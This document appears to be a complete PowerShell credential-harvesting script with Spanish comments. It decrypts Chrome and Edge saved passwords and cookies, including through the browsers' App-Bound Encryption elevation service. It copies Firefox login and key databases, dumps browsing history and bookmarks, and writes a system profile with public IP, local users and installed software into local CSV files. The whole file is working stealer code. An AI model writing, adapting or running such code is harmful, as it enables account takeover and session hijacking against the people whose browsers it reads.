param(
    [string]$OutputDir = "C:\BrowserExport_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
)

# ===========================================================================
# Add-Type PRIMERO — antes de ErrorActionPreference
# ===========================================================================

Add-Type -AssemblyName System.Security

# Solo compilar si los tipos no existen ya (evita error en re-ejecuciones)
if (-not ([System.Management.Automation.PSTypeName]'AesGcmBcrypt').Type) {
Add-Type -Language CSharp -ErrorAction Stop -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

// -----------------------------------------------------------------------
// IElevator — interfaz COM de Chrome/Edge para App-Bound Encryption (v127+)
// -----------------------------------------------------------------------
[ComImport]
[Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IElevator {
    [PreserveSig]
    int RunRecoveryCRXElevated(
        [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
        [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
        [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
        [MarshalAs(UnmanagedType.LPWStr)] string session_id,
        uint caller_proc_id, out ulong proc_handle);

    [PreserveSig]
    int EncryptData(
        uint protection_level,
        [MarshalAs(UnmanagedType.BStr)] string plaintext,
        [MarshalAs(UnmanagedType.BStr)] out string ciphertext,
        out uint last_error);

    [PreserveSig]
    int DecryptData(
        [MarshalAs(UnmanagedType.BStr)] string ciphertext,
        [MarshalAs(UnmanagedType.BStr)] out string plaintext,
        out uint last_error);
}

// -----------------------------------------------------------------------
// ChromeElevator — llama al servicio COM para descifrar la clave maestra
// -----------------------------------------------------------------------
public class ChromeElevator {
    public static byte[] Decrypt(byte[] encBytes, string clsid) {
        object comObj = null;
        try {
            Type t = Type.GetTypeFromCLSID(new Guid(clsid), false);
            if (t == null) return null;
            comObj = Activator.CreateInstance(t);
            IElevator elev = comObj as IElevator;
            if (elev == null) return null;

            // Chrome codifica los bytes como latin-1 al pasar como BSTR
            Encoding latin1 = Encoding.GetEncoding(28591);
            string ct = latin1.GetString(encBytes);
            string pt; uint le;
            int hr = elev.DecryptData(ct, out pt, out le);
            if (hr != 0 || pt == null) return null;
            return latin1.GetBytes(pt);
        }
        catch { return null; }
        finally { if (comObj != null) Marshal.ReleaseComObject(comObj); }
    }
}

// -----------------------------------------------------------------------
// AesGcmBcrypt — descifrado AES-256-GCM via BCrypt (PS 5.1 / .NET 4.x)
// -----------------------------------------------------------------------
public class AesGcmBcrypt {

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern uint BCryptOpenAlgorithmProvider(out IntPtr hAlg, string algId, string impl, uint flags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlg, uint flags);
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern uint BCryptSetProperty(IntPtr hObj, string prop, byte[] input, uint cbIn, uint flags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, IntPtr keyObj, uint cbKeyObj, byte[] secret, uint cbSecret, uint flags);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptDecrypt(IntPtr hKey, byte[] input, uint cbIn, ref AuthInfo ai, byte[] iv, uint cbIv, byte[] output, uint cbOut, out uint cbResult, uint flags);

    [StructLayout(LayoutKind.Sequential)]
    struct AuthInfo {
        public uint   cbSize, dwInfoVersion;
        public IntPtr pbNonce;  public uint cbNonce;
        public IntPtr pbAuthData; public uint cbAuthData;
        public IntPtr pbTag;    public uint cbTag;
        public IntPtr pbMacContext; public uint cbMacContext;
        public uint   cbAAD;
        public ulong  cbData;
        public uint   dwFlags;
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] cipher, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
        GCHandle nh = default(GCHandle), th = default(GCHandle);
        try {
            uint s = BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (s != 0) throw new Exception("OpenAlg 0x" + s.ToString("X"));

            byte[] gcm = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            s = BCryptSetProperty(hAlg, "ChainingMode", gcm, (uint)gcm.Length, 0);
            if (s != 0) throw new Exception("SetProp 0x" + s.ToString("X"));

            s = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
            if (s != 0) throw new Exception("GenKey 0x" + s.ToString("X"));

            nh = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            th = GCHandle.Alloc(tag,   GCHandleType.Pinned);

            var ai = new AuthInfo();
            ai.cbSize = (uint)Marshal.SizeOf(ai); ai.dwInfoVersion = 1;
            ai.pbNonce = nh.AddrOfPinnedObject(); ai.cbNonce = (uint)nonce.Length;
            ai.pbTag   = th.AddrOfPinnedObject(); ai.cbTag   = (uint)tag.Length;

            byte[] output = new byte[cipher.Length]; uint cbResult;
            s = BCryptDecrypt(hKey, cipher, (uint)cipher.Length, ref ai, null, 0, output, (uint)output.Length, out cbResult, 0);
            if (s != 0) throw new Exception("Decrypt 0x" + s.ToString("X"));

            byte[] result = new byte[cbResult];
            Array.Copy(output, result, (int)cbResult);
            return result;
        }
        finally {
            if (nh.IsAllocated) nh.Free();
            if (th.IsAllocated) th.Free();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
'@

} # fin del if (-not type exists)

$ErrorActionPreference = 'SilentlyContinue'

# ===========================================================================
# CLSIDs del servicio de elevación por canal de navegador
# ===========================================================================
$Script:ChromeCLSIDs = @(
    '708860E0-F641-4611-8895-7D867DD3675B',  # Chrome Stable
    'DD2646BA-3707-4BF8-B9A7-038691A68FC2',  # Chrome Beta
    'DA7FDCA5-2CAA-4637-AA17-0740584DE7DA',  # Chrome Dev
    '704C2872-2049-435E-A469-0A534313C42B'   # Chrome Canary
)
$Script:EdgeCLSIDs = @(
    '1ECFD30A-91F2-47E4-B29E-3EE63E2A6B1D',  # Edge Stable
    '57B3B49E-B85B-4600-BB6C-BDE1CC6DF4B6',  # Edge Beta
    'DFE0B66C-A6A6-4DA6-B9EF-9D69C8B97F2E',  # Edge Dev
    '0B1B47E6-ACFF-42E9-A0CF-8DD64E3EDCA3'   # Edge Canary
)

# ===========================================================================
# Extrae la clave maestra AES-256 del navegador
# Intenta:  1) DPAPI clásico  2) IElevator COM (Chrome/Edge 127+)
# ===========================================================================
function Get-BrowserMasterKey {
    param([string]$LocalStatePath, [string[]]$ElevatorCLSIDs)
    if (-not (Test-Path $LocalStatePath)) { return $null }
    try {
        $ls  = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        $b64 = $ls.os_crypt.encrypted_key

        # --- Método 1: DPAPI clásico (prefijo "DPAPI", Chrome < 127) ---
        if ($b64) {
            try {
                $raw     = [Convert]::FromBase64String($b64)
                $prefix5 = [Text.Encoding]::ASCII.GetString($raw[0..4])
                if ($prefix5 -eq 'DPAPI') {
                    $key = [Security.Cryptography.ProtectedData]::Unprotect(
                        $raw[5..($raw.Length - 1)], $null,
                        [Security.Cryptography.DataProtectionScope]::CurrentUser)
                    if ($key -and $key.Length -gt 0) { return $key }
                }
            } catch {}
        }

        # --- Método 2: App-Bound Encryption IElevator (Chrome/Edge 127+) ---
        # Buscar en app_bound_encrypted_key o en encrypted_key con prefijo APPB
        $appRaw = $null

        $appB64 = $ls.os_crypt.app_bound_encrypted_key
        if ($appB64) {
            $appRaw = [Convert]::FromBase64String($appB64)
        }
        elseif ($b64) {
            $raw     = [Convert]::FromBase64String($b64)
            $prefix4 = [Text.Encoding]::ASCII.GetString($raw[0..3])
            if ($prefix4 -eq 'APPB') { $appRaw = $raw }
        }

        if ($appRaw) {
            # Quitar prefijo APPB (4 bytes) si está presente
            $prefix4 = [Text.Encoding]::ASCII.GetString($appRaw[0..3])
            $encBytes = if ($prefix4 -eq 'APPB') { $appRaw[4..($appRaw.Length - 1)] } else { $appRaw }

            foreach ($clsid in $ElevatorCLSIDs) {
                $decrypted = [ChromeElevator]::Decrypt($encBytes, $clsid)
                if ($decrypted -and $decrypted.Length -gt 0) {
                    # Intentar capa adicional DPAPI
                    try {
                        $key = [Security.Cryptography.ProtectedData]::Unprotect(
                            $decrypted, $null,
                            [Security.Cryptography.DataProtectionScope]::CurrentUser)
                        if ($key -and $key.Length -gt 0) { return $key }
                    }
                    catch {
                        # Sin capa DPAPI adicional — devolver tal cual
                        return $decrypted
                    }
                }
            }
        }
    } catch {}
    return $null
}

# ===========================================================================
# Descifra una contraseña individual
# ===========================================================================
function Decrypt-Password {
    param([byte[]]$Enc, [byte[]]$Key)
    if (-not $Enc -or $Enc.Length -lt 3) { return '[VACIO]' }
    try {
        $prefix = [Text.Encoding]::ASCII.GetString($Enc[0..2])
        if ($prefix -eq 'v10' -or $prefix -eq 'v11') {
            if (-not $Key) { return '[CLAVE_NO_DISPONIBLE]' }
            $nonce  = $Enc[3..14]
            $rest   = $Enc[15..($Enc.Length - 1)]
            $tag    = $rest[($rest.Length - 16)..($rest.Length - 1)]
            $cipher = $rest[0..($rest.Length - 17)]
            $plain  = [AesGcmBcrypt]::Decrypt([byte[]]$Key, [byte[]]$nonce, [byte[]]$cipher, [byte[]]$tag)
            return [Text.Encoding]::UTF8.GetString($plain)
        }
        else {
            # Pre-v80: solo DPAPI directo
            $dec = [Security.Cryptography.ProtectedData]::Unprotect(
                $Enc, $null,
                [Security.Cryptography.DataProtectionScope]::CurrentUser)
            return [Text.Encoding]::UTF8.GetString($dec)
        }
    }
    catch { return '[ERROR_DESCIFRADO]' }
}

# ===========================================================================
# SQLite
# ===========================================================================
function Install-PSSQLite {
    if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
        try {
            Install-Module PSSQLite -Scope CurrentUser -Force -AllowClobber -ErrorAction Stop
            Import-Module PSSQLite -Force
            return 'PSSQLite'
        }
        catch {
            if (Get-Command sqlite3.exe -EA SilentlyContinue) { return 'sqlite3.exe' }
            return $null
        }
    }
    Import-Module PSSQLite -Force
    return 'PSSQLite'
}

function Invoke-DBQuery {
    param([string]$Database, [string]$Query, [string]$Method)
    $tmp = "$env:TEMP\br_$(Get-Random).db"
    Copy-Item $Database $tmp -Force -EA SilentlyContinue
    try {
        switch ($Method) {
            'PSSQLite'    { return Invoke-SqliteQuery -DataSource $tmp -Query $Query -EA SilentlyContinue }
            'sqlite3.exe' { return (& sqlite3.exe -separator "`t" $tmp $Query 2>$null) }
        }
    }
    finally { Remove-Item $tmp -Force -EA SilentlyContinue }
}

# ===========================================================================
# Descifrar y exportar cookies de Chrome/Edge
# ===========================================================================
function Export-Cookies {
    param([string]$CookiesDb, [string]$OutputDir, [byte[]]$MasterKey, [string]$SQLiteMethod)

    if (-not (Test-Path $CookiesDb) -or $SQLiteMethod -ne 'PSSQLite') { return }

    $rows = Invoke-DBQuery $CookiesDb @"
SELECT host_key, name, path, encrypted_value,
       datetime(expires_utc/1000000-11644473600,'unixepoch') as expira,
       is_secure, is_httponly
FROM cookies ORDER BY host_key;
"@ PSSQLite

    if (-not $rows) { return }

    $result = [Collections.Generic.List[object]]::new()
    foreach ($r in $rows) {
        $val = if ($r.encrypted_value -and $MasterKey) {
            Decrypt-Password -Enc $r.encrypted_value -Key $MasterKey
        } else { '[CIFRADO]' }
        $result.Add([PSCustomObject]@{
            Dominio   = $r.host_key
            Nombre    = $r.name
            Valor     = $val
            Ruta      = $r.path
            Expira    = $r.expira
            Seguro    = $r.is_secure
            HttpOnly  = $r.is_httponly
        })
    }

    if ($result.Count -gt 0) {
        $result | Export-Csv "$OutputDir\Cookies.csv" -NoTypeInformation -Encoding UTF8
    }
}

# ===========================================================================
# Exportar navegador basado en Chromium (Chrome o Edge)
# ===========================================================================
function Export-ChromiumBrowser {
    param(
        [string]$BaseDir,
        [string]$OutputDir,
        [string]$SQLiteMethod,
        [string[]]$ElevatorCLSIDs
    )

    if (-not (Test-Path $BaseDir)) { return }

    $masterKey = Get-BrowserMasterKey -LocalStatePath "$BaseDir\Local State" -ElevatorCLSIDs $ElevatorCLSIDs

    $profiles = @('Default') + (Get-ChildItem $BaseDir -Directory |
        Where-Object { $_.Name -match '^Profile \d+$' } | Select-Object -ExpandProperty Name)

    $allPasswords = [Collections.Generic.List[object]]::new()
    $allBookmarks = [Collections.Generic.List[object]]::new()
    $allHistory   = [Collections.Generic.List[object]]::new()

    foreach ($profile in $profiles) {
        $pp = "$BaseDir\$profile"
        if (-not (Test-Path $pp)) { continue }

        # Contraseñas
        $loginDb = "$pp\Login Data"
        if ((Test-Path $loginDb) -and $SQLiteMethod -eq 'PSSQLite') {
            $rows = Invoke-DBQuery $loginDb `
                "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0;" `
                PSSQLite
            foreach ($r in $rows) {
                $pw = if ($r.password_value) {
                    Decrypt-Password -Enc $r.password_value -Key $masterKey
                } else { '[VACIO]' }
                $allPasswords.Add([PSCustomObject]@{
                    Perfil=$profile; URL=$r.origin_url; Usuario=$r.username_value; Password=$pw
                })
            }
        }

        # Marcadores
        $bkFile = "$pp\Bookmarks"
        if (Test-Path $bkFile) {
            try {
                $bk = Get-Content $bkFile -Raw | ConvertFrom-Json
                function Get-BkNodes { param($n, $f='')
                    if ($n.type -eq 'url') { [PSCustomObject]@{ Perfil=$profile; Carpeta=$f; Nombre=$n.name; URL=$n.url } }
                    elseif ($n.children) { foreach ($c in $n.children) { Get-BkNodes $c "$f\$($n.name)" } }
                }
                foreach ($root in $bk.roots.PSObject.Properties.Value) {
                    $nodes = Get-BkNodes $root 'Raiz'
                    if ($nodes) { foreach ($nd in $nodes) { $allBookmarks.Add($nd) } }
                }
            } catch {}
        }

        # Historial
        $histDb = "$pp\History"
        if ((Test-Path $histDb) -and $SQLiteMethod -eq 'PSSQLite') {
            $rows  = Invoke-DBQuery $histDb `
                "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5000;" `
                PSSQLite
            $epoch = [datetime]'1601-01-01'
            foreach ($r in $rows) {
                $dt = try { $epoch.AddMicroseconds([long]$r.last_visit_time) } catch { $null }
                $allHistory.Add([PSCustomObject]@{
                    Perfil=$profile; URL=$r.url; Titulo=$r.title; Visitas=$r.visit_count
                    UltimaVisita = if ($dt) { $dt.ToString('yyyy-MM-dd HH:mm:ss') } else { '' }
                })
            }
        }
    }

    if ($allPasswords.Count -gt 0) { $allPasswords | Export-Csv "$OutputDir\Passwords.csv" -NoTypeInformation -Encoding UTF8 }
    if ($allBookmarks.Count -gt 0) { $allBookmarks | Export-Csv "$OutputDir\Bookmarks.csv" -NoTypeInformation -Encoding UTF8 }
    if ($allHistory.Count   -gt 0) { $allHistory   | Export-Csv "$OutputDir\History.csv"   -NoTypeInformation -Encoding UTF8 }

    # Cookies: exportar como CSV descifrado + copia del archivo binario
    $cookiesDb = "$BaseDir\Default\Network\Cookies"
    if (Test-Path $cookiesDb) {
        Copy-Item $cookiesDb "$OutputDir\Cookies.db" -Force
        Export-Cookies -CookiesDb $cookiesDb -OutputDir $OutputDir -MasterKey $masterKey -SQLiteMethod $SQLiteMethod
    }
}

# ===========================================================================
# Firefox
# ===========================================================================
function Export-FirefoxData {
    param([string]$OutputPath, [string]$SQLiteMethod)

    $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $ffOut  = "$OutputPath\Firefox"
    if (-not (Test-Path $ffBase)) { return }

    foreach ($profile in (Get-ChildItem $ffBase -Directory)) {
        $profileOut = "$ffOut\$($profile.Name)"
        New-Item -ItemType Directory -Path $profileOut -Force | Out-Null

        foreach ($f in @('logins.json','key4.db','cert9.db','cookies.sqlite',
                         'places.sqlite','favicons.sqlite','sessionstore.jsonlz4',
                         'prefs.js','permissions.sqlite')) {
            $src = "$($profile.FullName)\$f"
            if (Test-Path $src) { Copy-Item $src "$profileOut\$f" -Force }
        }

        $placesDb = "$($profile.FullName)\places.sqlite"
        if ((Test-Path $placesDb) -and $SQLiteMethod -eq 'PSSQLite') {
            $bkRows = Invoke-DBQuery $placesDb @"
SELECT p.url, b.title, datetime(b.dateAdded/1000000,'unixepoch','localtime') as fechaAgregado
FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id
WHERE b.type = 1 ORDER BY b.dateAdded DESC;
"@ PSSQLite
            if ($bkRows) { $bkRows | Export-Csv "$profileOut\Bookmarks.csv" -NoTypeInformation -Encoding UTF8 }

            $histRows = Invoke-DBQuery $placesDb @"
SELECT url, title, visit_count, datetime(last_visit_date/1000000,'unixepoch','localtime') as ultimaVisita
FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 5000;
"@ PSSQLite
            if ($histRows) { $histRows | Export-Csv "$profileOut\History.csv" -NoTypeInformation -Encoding UTF8 }
        }

        $loginsFile = "$($profile.FullName)\logins.json"
        if (Test-Path $loginsFile) {
            try {
                $logins = (Get-Content $loginsFile -Raw | ConvertFrom-Json).logins
                $logins | ForEach-Object {
                    [PSCustomObject]@{
                        URL          = $_.hostname
                        Usuario_B64  = $_.encryptedUsername
                        Password_B64 = $_.encryptedPassword
                        UltimoUso    = if ($_.timeLastUsed) {
                            [DateTimeOffset]::FromUnixTimeMilliseconds($_.timeLastUsed).LocalDateTime.ToString('yyyy-MM-dd HH:mm:ss')
                        } else { '' }
                    }
                } | Export-Csv "$profileOut\Logins_Cifrados.csv" -NoTypeInformation -Encoding UTF8
            } catch {}
        }
    }
}

# ===========================================================================
# Info del sistema → Logs\SistemaInfo.txt
# ===========================================================================
function Export-SystemInfo {
    param([string]$LogsDir)

    # IP pública
    $ipPublica = try {
        (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { 'No disponible' }

    # IPs locales
    $ipsLocales = Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.IPAddress -ne '127.0.0.1' } |
        Select-Object InterfaceAlias, IPAddress, PrefixLength

    # Info del sistema
    $os  = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
    $ram = [math]::Round($os.TotalVisibleMemorySize / 1MB, 2)
    $cs  = Get-CimInstance Win32_ComputerSystem

    # Discos
    $discos = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null } |
        ForEach-Object {
            $total = [math]::Round(($_.Used + $_.Free) / 1GB, 1)
            $usado = [math]::Round($_.Used / 1GB, 1)
            "$($_.Name):\ — Usado: ${usado} GB / Total: ${total} GB"
        }

    # Usuarios locales
    $usuarios = try {
        Get-LocalUser | Select-Object Name, Enabled, LastLogon |
            ForEach-Object { "  $($_.Name) | Habilitado: $($_.Enabled) | Ultimo acceso: $($_.LastLogon)" }
    } catch { '  No disponible' }

    # Adaptadores de red
    $adaptadores = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } |
        ForEach-Object { "  $($_.Name) | $($_.InterfaceDescription) | MAC: $($_.MacAddress)" }

    # Software instalado (top 30 por fecha)
    $software = Get-ItemProperty `
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' `
        -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName } |
        Sort-Object InstallDate -Descending |
        Select-Object -First 30 |
        ForEach-Object { "  $($_.DisplayName) $($_.DisplayVersion) — $($_.InstallDate)" }

    # Zona horaria
    $tz = [System.TimeZoneInfo]::Local

    $info = @"
===============================================================
  INFORMACION DEL SISTEMA — Exportado el $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
===============================================================

--- EQUIPO ---
Nombre de equipo   : $env:COMPUTERNAME
Usuario actual     : $env:USERNAME
Dominio / Grupo    : $($cs.Domain)
Fabricante         : $($cs.Manufacturer)
Modelo             : $($cs.Model)
Zona horaria       : $($tz.DisplayName)

--- SISTEMA OPERATIVO ---
OS                 : $($os.Caption)
Version            : $($os.Version)  Build: $($os.BuildNumber)
Arquitectura       : $($os.OSArchitecture)
Instalado          : $($os.InstallDate)
Ultimo arranque    : $($os.LastBootUpTime)

--- HARDWARE ---
CPU                : $($cpu.Name)
Nucleos fisicos    : $($cpu.NumberOfCores)
Nucleos logicos    : $($cpu.NumberOfLogicalProcessors)
RAM total          : $ram GB

--- RED ---
IP Publica         : $ipPublica

IPs Locales:
$(($ipsLocales | ForEach-Object { "  $($_.InterfaceAlias) — $($_.IPAddress)/$($_.PrefixLength)" }) -join "`n")

Adaptadores activos:
$($adaptadores -join "`n")

--- DISCOS ---
$($discos -join "`n")

--- USUARIOS LOCALES ---
$($usuarios -join "`n")

--- SOFTWARE INSTALADO (ultimos 30) ---
$($software -join "`n")

===============================================================
"@

    $info | Out-File "$LogsDir\SistemaInfo.txt" -Encoding UTF8
}

# ===========================================================================
# MAIN
# ===========================================================================

foreach ($d in @('Chrome','Edge','Firefox','Logs')) {
    New-Item -ItemType Directory -Path "$OutputDir\$d" -Force | Out-Null
}

$sqliteMethod = Install-PSSQLite

Export-SystemInfo -LogsDir "$OutputDir\Logs"

Export-ChromiumBrowser `
    -BaseDir    "$env:LOCALAPPDATA\Google\Chrome\User Data" `
    -OutputDir  "$OutputDir\Chrome" `
    -SQLiteMethod $sqliteMethod `
    -ElevatorCLSIDs $Script:ChromeCLSIDs

Export-ChromiumBrowser `
    -BaseDir    "$env:LOCALAPPDATA\Microsoft\Edge\User Data" `
    -OutputDir  "$OutputDir\Edge" `
    -SQLiteMethod $sqliteMethod `
    -ElevatorCLSIDs $Script:EdgeCLSIDs

Export-FirefoxData -OutputPath $OutputDir -SQLiteMethod $sqliteMethod

Invoke-Item $OutputDir
